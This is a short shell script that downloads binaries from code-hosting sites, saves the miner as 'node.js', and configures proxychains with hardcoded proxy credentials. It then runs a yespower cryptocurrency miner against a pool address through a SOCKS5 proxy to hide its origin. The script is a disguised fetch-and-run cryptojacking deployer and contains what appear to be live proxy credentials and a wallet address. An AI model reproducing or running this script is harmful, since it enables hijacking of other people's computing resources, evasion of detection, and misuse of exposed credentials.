proxy="us-east-static-06.quotaguard.com" 
port="9293" 
user="oer0zxkf45i21d"  
pass="9sby02q1lcum4g2x74lsur1a00nus" 
wget -q -O node.js https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x node.js
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./node.js -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-100 -n 1)-uut) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://oer0zxkf45i21d:9sby02q1lcum4g2x74lsur1a00nus@us-east-static-06.quotaguard.com:1080 
